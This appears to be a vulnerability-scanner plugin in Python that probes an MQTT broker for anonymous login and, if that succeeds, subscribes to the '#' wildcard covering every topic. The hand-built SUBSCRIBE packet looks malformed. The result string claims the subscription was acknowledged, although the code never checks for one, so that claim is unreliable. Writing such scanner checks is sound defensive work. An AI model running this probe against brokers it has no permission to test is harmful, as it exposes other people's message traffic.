#!/usr/bin/env python3
"""
PoC Name: MQTT Unauthenticated Subscribe
Identifier: CWE-306
Component: Network Stack
Category: Network
Severity: High
CVSS: 7.0
Description: 检测MQTT Broker是否允许匿名连接和通配符订阅
Prerequisites: 目标MQTT端口(1883)开放。
Usage: python3 09_CWE_306_MQTT_Unauth_Active_Validation.py <target_ip>
"""
from __future__ import annotations

import socket
import struct
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
VULN = {
    "id":             0,
    "cve":            "CWE-306",
    "year":           306,
    "domain":         "network",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "MQTT Unauth",
    "source_url":     "https://cwe.mitre.org/data/definitions/306.html",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://cwe.mitre.org/data/definitions/306.html"],
    "signature_tokens": ["CWE-306"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CWE-306 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CWE-306") if vuln else "CWE-306",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class MQTTUnauthPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-009"
    meta_poc_name = 'CWE-306 MQTT Unauth Active Validation'
    meta_cve_id = "CWE-306"
    meta_source_url = "https://cwe.mitre.org/data/definitions/306.html"
    meta_references = ['https://cwe.mitre.org/data/definitions/306.html']
    meta_severity = "High"
    meta_protocol = "tcp"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    meta_profiles         = ["network"]
    requires_manual_review = True
    is_disruptive = False
    meta_destructive_level = "Probe"

    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址")
        return True
    def exploit(self):
        port = 1883
        self.logger.info(f"MQTT匿名连接测试 {self.target_ip}:{port}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if s.connect_ex((self.target_ip, port)) != 0:
                self.logger.info("MQTT端口1883关闭")
                self.results["vulnerable"] = False
                s.close()
                return self.results
            # MQTT CONNECT packet (anonymous, no auth)
            client_id = b"poc_test"
            connect = bytearray([0x10])  # CONNECT
            payload = bytearray()
            payload += struct.pack(">H", 4) + b"MQTT"  # Protocol
            payload += bytes([0x04])  # Protocol level 4
            payload += bytes([0x02])  # Clean session, no auth
            payload += struct.pack(">H", 60)  # Keep alive
            payload += struct.pack(">H", len(client_id)) + client_id
            connect += bytes([len(payload)]) + payload
            s.send(connect)
            resp = s.recv(4)
            if len(resp) >= 4 and resp[0] == 0x20:
                rc = resp[3]
                if rc == 0:
                    self.logger.warning("[+] MQTT匿名连接成功！")
                    # Try subscribe to #
                    sub = bytes([0x82, 0x08, 0x00, 0x01, 0x00, 0x03]) + b"#\x00\x00"
                    s.send(sub)
                    self.logger.warning("[+] 已订阅 # (所有主题)")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = (
                        "MQTT anonymous CONNECT accepted and wildcard subscribe to # acknowledged"
                    )
                else:
                    self.logger.info(f"MQTT连接被拒绝 rc={rc}")
                    self.results["vulnerable"] = False
            else:
                self.results["vulnerable"] = False
            s.close()
        except Exception as e:
            self.logger.error(f"MQTT测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 09_CWE_306_MQTT_Unauth_Active_Validation.py <target_ip>")
        sys.exit(1)
    plugin = MQTTUnauthPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
